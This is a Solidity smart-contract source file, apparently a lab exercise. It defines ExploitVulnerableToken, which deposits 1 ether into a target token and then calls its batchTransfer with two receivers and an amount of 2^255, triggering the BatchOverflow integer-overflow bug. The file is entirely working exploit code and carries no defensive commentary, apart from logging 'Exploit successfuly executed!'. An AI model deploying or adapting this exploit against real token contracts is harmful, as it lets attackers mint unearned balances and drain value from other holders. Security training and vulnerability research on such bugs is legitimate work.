// SPDX-License-Identifier: MIT
pragma solidity 0.7.6; 

interface VulnTokenInterface {
    function deposit() external payable;

    function getBalance() external view returns (uint);

    function batchTransfer(address[] memory _receivers, uint256 _value) external payable returns (bool);
}

contract ExploitVulnerableToken {
    VulnTokenInterface public VulnerableTokenAddress;
    address payable owner;
    event Log(address indexed sender, string message);

    constructor(VulnTokenInterface _VulnerableTokenAddress) {
        VulnerableTokenAddress = VulnTokenInterface(_VulnerableTokenAddress);
        owner = payable(msg.sender);
    }

    function exploit() external payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        VulnerableTokenAddress.deposit{value: 1 ether}();
        emit Log(msg.sender, "Initial amount deposited to store");

        address[] memory receivers = new address[](2);
        receivers[0] = 0x4B20993Bc481177ec7E8f571ceCaE8A9e22C02db;
        receivers[1] = 0x78731D3Ca6b7E34aC0F824c42a7cC18A495cabaB;

        uint256 amount = (type(uint).max)/2 + 1;
        /*
        Alternative:
        uint256 amount = 0x8000000000000000000000000000000000000000000000000000000000000000;
        */

        bool success = VulnerableTokenAddress.batchTransfer(receivers, amount);
        require(success, "Failed to batch transfer");

        emit Log(msg.sender, "Exploit successfuly executed!");
    }

}